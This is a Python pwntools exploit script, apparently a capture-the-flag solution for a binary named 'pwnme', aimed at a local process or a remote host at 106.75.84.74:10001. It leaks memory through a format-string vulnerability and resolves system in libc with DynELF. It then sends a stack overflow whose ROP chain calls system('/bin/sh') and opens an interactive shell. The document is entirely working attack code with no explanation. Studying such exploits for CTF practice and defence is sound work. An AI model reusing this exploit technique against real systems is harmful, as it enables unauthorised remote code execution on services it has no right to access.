from pwn import *
 
DEBUG = 1
ATTACH = 1
 
def leak(addr):
	io.recvuntil('>')
	io.sendline('2')
	io.recvuntil('please input new username(max lenth:20): \n')
	io.sendline('BBBB')
	io.recvuntil('please input new password(max lenth:20): \n')
	payload1 = '%12$s' + 'BIRDGO!' + p64(addr)
	io.send(payload1)
	io.recvuntil('>')
	io.sendline('1')
	content = io.recvuntil('BIRDGO!')
	if len(content) == 12:
		return '\x00'
	else:
		return content[5:-7]
 
if DEBUG:
	 context.log_level = 'debug'
	 io = process('./pwnme')
if ATTACH:
	 gdb.attach(io)
else:
	 io = remote('106.75.84.74', 10001)
 
# raw_input('go?')
 
io.recvuntil('Input your username(max lenth:40): \n')
io.sendline('A')
io.recvuntil('Input your password(max lenth:40): \n')
io.sendline('1')
 
d = DynELF(leak, elf=ELF('./pwnme'))
system_addr = d.lookup('system', 'libc')
log.info('system_addr:%#x' % system_addr)
 
io.recvuntil('>')
io.sendline('2')
io.recvuntil('please input new username(max lenth:20): \n')
io.sendline('A')
io.recvuntil('please input new password(max lenth:20): \n')
 
pop_rdi_ret_addr = 0x400ed3
pop_pop_pop_pop_po_ret = 0x400ecb
init_gadget = 0x400EB0
payload = 'A' * 0x28
bin_sh_addr = 0x602800
payload += p64(pop_pop_pop_pop_po_ret) + p64(0x1) + p64(0x601FC8) + p64(0x8) + p64(bin_sh_addr) + p64(0)
payload += p64(init_gadget) + p64(0x8) * 7
payload += p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)
payload = payload.ljust(0x101, 'A')
io.sendline(payload)
io.send('/bin/sh\x00')
io.interactive()
#io.recv()